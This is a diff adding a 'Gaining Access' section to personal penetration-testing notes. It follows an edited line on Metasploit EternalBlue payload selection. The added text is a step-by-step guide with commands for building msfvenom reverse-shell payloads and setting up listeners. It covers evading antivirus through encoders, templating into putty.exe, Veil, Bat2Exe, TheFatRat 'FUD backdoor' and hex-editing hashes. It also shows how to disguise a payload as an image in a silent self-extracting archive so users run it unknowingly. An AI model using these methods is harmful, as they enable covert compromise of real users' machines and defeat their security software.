@@ -256,7 +256,7 @@ now we run the exploit that resulted in the search as follows, i.e: ms17_010_ete
 set the options (RHOSTS) 
 after above cmd a default payload will be setup but make sure it matches the target's pc architecture as by default 64bit meterpreter revshell for windows would be selected
 so to change it use the foll:
-> set payload windows/meterpreter/reverse_tcp
+> set payload windows/meterpreter/reverse_tcp (in case of 64 bit the payload selection will be: "windows/x64/meterpreter/reverse_tcp")
 now run 'exploit' to start the exploitation
 after gaining the shell access in meterpreter use the following cmd to view the account type:
 > getuid (getuserid[OUTPUT: NT AUTHORITY/SYSTEM] this account type is the highest account privilege rights) 
@@ -342,3 +342,137 @@ FOR MORE: https://www.threat9.com/blog
 
 
 
+____________________________________________________________________
+GAINING ACCESS
+____________________________________________________________________
+
+this section pretty much talks about gaining access where previously(exploitation section) we did the same but what if the target doesn't have any type of vulnerability present nor an exploit to gain access.
+but thing to remember is that the attacker's part is also to deliver the payload to the target machine no matter what medium it is(previously it was done with the help of an exploit).
+right now we need the target to execute it on behalf of the attacker(eg: through email, http webpage, usb drive etc) and along with that try bypassing antivirus softwares and other types of detections that forces against our payloads
+Creating payloads can be done with the help of a tool called MSFVENOM
+
+(msfvenom)-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|  
+|  MSFVENOM is used to generate payloads really fast with a simple command and gain target's access
+|  for help menu:
+|  > msfvenom -h
+|  to create a payload we do the foll.:
+|  > msfvenom -p <type_of_payload> LHOST <attacker's_ip> LPORT <attacker's_port> -f <payload's_extension> -o <filename_/w_extension> (here <type_of_payload> is similar to the one like we saw in msfc)
+|  eg: > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST 192.168.1.13 LPORT 5555 -f exe -o shell.exe
+|  in the above eg. we're creating a payload(-p) for winx64 OS i.e. a rev_shell with our attacker's ip and port so that the target machine connects to our attacker's PC to output a shell. -o is the output filename and -f is the extension of the outputfile which works as a legitimate .exe file)
+|  the outputfile would be in the Desktop/ (for now we can copy the payload to the target's machine using a USB drive or a local python file server)
+|  to create a python http file server use the cmd as follows:
+|  python3 -m http.server <port_number>
+|  now after copying/downloading the payload to the target's machine(make sure windows defender is off and also the firewall later we'll check to bypass these) we need to create a rev shell so that we can listen to the port we mentioned in the payload
+|  we can use nc(netcat) to listen but msfc provides with a much more adv. exploit than nc i.e. as follows:
+|  > use exploit/multi/handler
+|  see options and set to the same LHOST and RHOST that was in the payload and along with that set the payload similar to the payload we created in msfvenom as follows:
+|  > set LHOST 192.168.1.13
+|  > set LPORT 5555
+|  > set payload windows/x64/meterpreter/reverse_tcp
+|  > run
+|  now after running the listener in the attacker's PC we can run the payload in the target's side so that it'll start the meterpreter session
+|  make sure you run the listener before the payload in the target's pc is executed
+|  (here questions might be raised like what's the use of copying the payload intentionally and pasting in the target's PC, and call it hacking? but the point here is that user make mistakes and try downloading stuffs from the internet they see, so using that as a vulnerability(a person download miscellaneous softs. from the internet) and the uesr as an exploit, hacker tries to make them download the malicious file(payload), and as said already it can be by any medium(email, web server, copying it directly using USB stick etc))
+|  
+|  MSFVENOM ADVANCED OPTIONS:
+|  other advanced options usually be to bypass antivirus, reduce payload's size etc.
+|  to see what all extensions can msfv create a payload, we can use the foll. cmd:
+|  > msfvenom --list formats (other --list values are: payloads, encoders, nops, platforms, archs, encrypt, all)
+|  there's reason for using these different formats since it makes the payload undetectable by any antivirus software.
+|  to check the level of detectablity we can use the following link: https://www.virustotal.com/gui
+|  This website allows to upload the payload we created using msfv and check whether it is detectable by several antivirus softwares,
+|  but if the level is lower it doesn't mean it would be undetectable later where they might be detectable after a few days/ a week(This isn't really something to worry about but there are someother websites like virustotal which doesn't share the payload's fingerprint but virustotal's the best so far)
+|  
+|  now let's create 2 different payloads and let's compare their detection level:
+|  payload 1 (a simple one with no adv. features used):
+|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o shell.exe
+|  payload 2 (/w adv. options used):
+|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -a x64 -e x64/zutto-dekiru -i 15 --platform windows -n 500 -f exe -o shell.exe
+|  the definitions for the above used cmd flags are as follows:
+|  -a - architecture of the target's machine [x64|x32] (to list all use "> msfvenom --list archs")
+|  -e - encoder is designed to take the input (shellcode) and transform it somehow, encoding the same instructions in different bytes to make it undetectable by antivirus softs. Here we've used an x64 bit specific encoder(to list all encoders available, the cmd "> msfvenom --list encoders" can be used)
+|  -i - no. of iterations the encoder encodes the shell code(make sure that greater the iteration, greater the payload's size but less detectable by AVS(antivirus softwares) and viceversa)
+|  --platform - OS that the target's running (to list all use "> msfvenom --list platforms")
+|  -n - no operation prepended to the payload with a specific length
+|  
+|  now on comparing both these payloads in virustotal the one with advanced options is much less FUD(fully undetectable) by AVS(even though we create payloads with msfv and still be used by a vast majority payloads it creates are likely detectable nowadays)
+|  we can also use another option called templating(-x) i.e. taking a legitmate .exe file and creates a shell around it. Eg: using the software Putty for the follwing example:
+|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -x putty.exe -o shell.exe (also when scanning this in virustotal it can bypass some reasonable amount of antiviruses)
+|  NOTE: for the above cmd while templating would end up in success as it might not work and it depends upon the template software that we'll use. so choose wise!
+|  
+|  we can also send another format(extension) of payload using the -f flag which makes it bypass pretty much all AVS, but there are some problems with it
+|  i.e. the extensions that needs software/compiler/interpreter might not be installed in the target's system.
+|  eg: python might be installed only in linux and mac but not on windows so on distribution there be no way of running the payload but rather install python in order to execute the payload
+
+OTHER TOOLS LIKE MSFVENOM FOR PAYLOAD CREATION(the following tools present below should be ran with root access(> sudo su)):
+veil (apt-get install veil)
+        > veil
+        > use 1 (use evasion)
+        > list (lists all payloads)
+        > use 22 (for selecting the foll. payload: powershell/meterpreter/rev_tcp.py)
+        > set SLEEP 20 (once target executes the program sleeps for 20 seconds before starting the portforwarding process)
+        > set LHOST <target_ip>
+        > generate (to generate the output file)
+        after this it asks for the filename so given: powerpayload
+        now the src code will be present in /var/lib/veil/output/source/powerpayload.bat
+        and a metasploit resource file will be written to /var/lib/veil/output/handlers/powerpayload.rc
+        METASPLOIT RESOURCE file consists of predefined options that we've set in the veil using the set command, so no need reinitializing the LHOST, LPORT again for everything time
+        since the output file is a .bat file (powerpayload.bat) we need to convert it to an .exe since a basic code when loaded will trigger AVS
+        so well use a software called Bat2Exe(B2E) https://github.com/tokyoneon/B2E.git that converts bat file to an exe file. This runs only in windows so we'll use wine in order to install it in Kali Linux as follows:
+        > cd <git_cloned_location>/B2E
+        > unzip <cloned_zip_filename>
+        > wine <program_name.exe> (bunch of next n times and install)
+
+        now knowing the location of the .batfile we'll open it in the B2E application
+        there are several options but mainly there's an option called Packer(to enable UPX compression but it triggers a lot of AVS so uncheck it)
+        go to converter and click convert and select destination to save it
+        now try transferring the powerpayload.exe to the target's system
+        now open msfc and copy the msf resource file location and type the following cmd:
+        > resource /var/lib/veil/output/handlers/powerpayload.rc (this sets the options for our exploit to start listening in the background)
+        now executing the powerpayload.exe in target's system will produce a shell after 20 seconds since we gave a cmd SLEEP 20, in order to create a different hash for the .exe which makes it bypassable by some AVS
+        and then we gain the meterpreter session opened and to execute it:
+        > sessions (to view sessions that are active)
+        > sessions -i <session_Id>
+
+thefatrat (https://github.com/screetsec/TheFatRat.git)
+        follow the README.md to install thefatrat after that:
+        > fatrat
+        > 6 (for selection the foll. option: Create FUD Backdoor 1000% with PwnWinds)
+        > 2 (Create exe file with C# + Powershell (FUD 100%))
+        Set LHOST, LPORT IP
+        asks for basename for output file: BatBackdoor
+        asks us type of payload we select windows/meterpreter/reverse_tcp (not sure whether it is architecture independent)
+        shows the location of the outputfile: /root/Fatrat_Generated/RatBackdoor.exe
+        for setting up the listener we can press number (9) to jump back to menu and select number(10) to jump to msfc and setup options for exploit/multi/handler and start listening
+        now transfer the .exe payload from the output folder to our target's system
+        next after a session is established we get the meterpreter shell opened
+
+NOTE: There is no clear way of bypassing AVS and these methods get outdated all the time and new ones occur. However there are things that you can do to make your payload less detected
+such as:
+        -> Creating your own payloads:
+                Best way to learn a programming language and start creating payloads with it or use and existing one 
+                and try adding some dummy functions that does nothing but just creates a different hash
+        -> Keeping updated with new tools:
+                searching for different new tools online so that it is not widely being used for the timebeing so it might be FUD
+        -> Using tools and try creating new hashes out of it:
+                try creating a payload with known tools and try to insert new code that makes no sense but doesn't output an error
+                other means such as using msfv and hexeditor we can change the binary of the executable payload as follows:
+                > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<target_ip> LPORT=<target_port> -f exe -o shell.exe (create a payload using msfv)
+                note down the hash of the payload by using the cmd: 'md5sum <payload_name.exe>
+                > hexeditor <payload_name.exe>
+                here after opening make sure not to change anything unwanted but change stuffs like a string that might look like "This program cannot be run in DOS mode"
+                try changing values from 0-9 and a-f and save it using ctrl+x
+                now compare the hash with the older payload and the one we changed with hex editor, they'll be totally different
+        -> masking payloads to look different:
+                there are several ways of doing but, the foll. shows you how to merge a png image with a payload(but it will create an exe as the output file but still windows has extension view disabled by default) and on clicking an image would open in the foreground and the payload in the background
+                first create an icon file and a simple payload with msfv
+                now in windows select both .png and payload.exe and click "add to archive"(need winrar for this)
+                set a name for it (car.exe) and the archive format to ZIP and in archiving options check "create SFX archive"
+                goto advanced and click SFX options and under setup give the names of the file that need to be execute in order as follows:
+                car.png
+                payload.exe
+                then goto modes and in silent mode set the "hide all" option
+                then in update tab, in update mode set "extract and update files" and in overwrite mode set "overwrite all files" 
+                then in text and icon tab, browse for "Load SFX icon from the file" and select the icon file and then click "OK"
+                the masked payload will be created
